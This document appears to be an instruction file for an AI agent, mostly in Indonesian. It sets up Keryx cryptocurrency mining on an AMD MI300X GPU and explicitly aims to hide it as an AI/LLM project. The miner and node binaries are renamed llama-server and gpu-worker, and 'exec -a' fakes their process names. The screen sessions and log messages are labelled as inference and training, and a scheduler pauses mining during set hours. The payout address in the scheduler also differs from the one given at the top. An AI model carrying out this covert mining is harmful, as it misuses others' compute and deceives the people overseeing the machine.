# PROMPT.md — Quick Start (untuk agent yang sudah paham)

## TUJUAN
Setup Keryx solo mining di AMD MI300X, stealth sebagai AI/LLM project.

## ADDRESS
```
keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq3
```

## QUICK STEPS

### 1. Install & Build
```bash
# Rust + deps
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source "$HOME/.cargo/env"
apt-get update && apt-get install -y protobuf-compiler clang libclang-dev libstdc++-14-dev librocksdb-dev libsnappy-dev liblz4-dev libzstd-dev libbz2-dev zip

# Workspace
mkdir -p /opt/ai-workspace/{inference,training,models,checkpoints,data,logs,metrics,notebooks}

# Build node
cd /root && rm -rf keryx-node && git clone https://github.com/Keryx-Labs/keryx-node.git && cd keryx-node
export BINDGEN_EXTRA_CLANG_ARGS="-I/usr/lib/llvm-18/lib/clang/18/include -I/usr/include/x86_64-linux-gnu"
cargo build --release -p keryxd

# Build miner (with 4 patches)
cd /root && rm -rf keryx-miner-src && git clone https://github.com/Keryx-Labs/keryx-miner.git keryx-miner-src && cd keryx-miner-src
# APPLY 4 PATCHES — lihat SETUP.md untuk detail patch
source "$HOME/.cargo/env" && cargo build --release
```

### 2. Deploy
```bash
cp /root/keryx-node/target/release/keryxd /opt/ai-workspace/inference/llama-server
cp /root/keryx-miner-src/target/release/keryx-miner /opt/ai-workspace/training/gpu-worker
cp /root/keryx-miner-src/target/release/libkeryxopencl.so /opt/ai-workspace/training/libkeryxopencl.so
cp -r /root/keryx-miner-src/target/release/models /opt/ai-workspace/models/keryx 2>/dev/null
openssl rand -hex 32 > /opt/ai-workspace/checkpoints/model-key.bin
```

### 3. Create wrappers + scheduler
```bash
# Wrapper node
cat > /opt/ai-workspace/inference/start.sh << 'EOF'
#!/bin/bash
exec -a "[llama-server]" /opt/ai-workspace/inference/llama-server --utxoindex --rpclisten-json=default --rpclisten-borsh=default "$@"
EOF

# Wrapper miner
cat > /opt/ai-workspace/training/start.sh << 'EOF'
#!/bin/bash
exec -a "[gpu-worker]" /opt/ai-workspace/training/gpu-worker "$@"
EOF

# Scheduler (OFF 21:00-02:00 WIB)
cat > /opt/ai-workspace/scheduler.sh << 'EOF'
#!/bin/bash
WRKDIR="/opt/ai-workspace"; BIN="$WRKDIR/training/gpu-worker"
ADDR="keryx:qqy7gqxd5xhvr2l2er2ksmaplre22369qnc4edug88kg8y440g0ag2u2ekq73"
KEY="$WRKDIR/checkpoints/model-key.bin"; LOG="$WRKDIR/logs/training.log"
OFF_START=14; OFF_END=19
while true; do
    HOUR=$(date -u +%H); HOUR=${HOUR#0}
    if [ "$HOUR" -ge "$OFF_START" ] && [ "$HOUR" -lt "$OFF_END" ]; then
        echo "[$(date -u)] scheduler: maintenance window (OFF)" >> "$LOG"; sleep 300
    else
        echo "[$(date -u)] scheduler: training cycle start" >> "$LOG"
        "$BIN" --mining-address "$ADDR" --escrow-key-file "$KEY" --light --cpu-inference 2>&1 | tee -a "$LOG"
        echo "[$(date -u)] scheduler: training cycle ended, restarting..." >> "$LOG"
    fi
done
EOF

chmod +x /opt/ai-workspace/inference/start.sh /opt/ai-workspace/training/start.sh /opt/ai-workspace/scheduler.sh
```

### 4. Start
```bash
screen -dmS llm-inference bash -c '/opt/ai-workspace/inference/start.sh > /opt/ai-workspace/logs/inference.log 2>&1'
# Tunggu sync: tail -f /opt/ai-workspace/logs/inference.log → cari "Tx throughput stats"
screen -dmS ai-training bash /opt/ai-workspace/scheduler.sh
```

### 5. Verifikasi
```bash
ps aux | grep -E "llama-server|gpu-worker" | grep -v grep
screen -ls
grep "hashrate" /opt/ai-workspace/logs/training.log | tail -3
```

## ⚠️ KRITIS
- `libkeryxopencl.so` HARUS di `/opt/ai-workspace/training/` (sama dengan `gpu-worker`)
- JANGAN skip 4 patch
- JANGAN ganti address
- JANGAN start miner langsung — harus via scheduler

## TROUBLESHOOTING CEPAT
| Error | Fix |
|---|---|
| `No workers specified` | Copy `libkeryxopencl.so` ke `/opt/ai-workspace/training/` |
| `transaction already in mempool` | Restart node saja |
| Hashrate rendah | Tunggu OPoI selesai (1-2 menit) |

---

**Detail lengkap:** Lihat `SETUP.md`
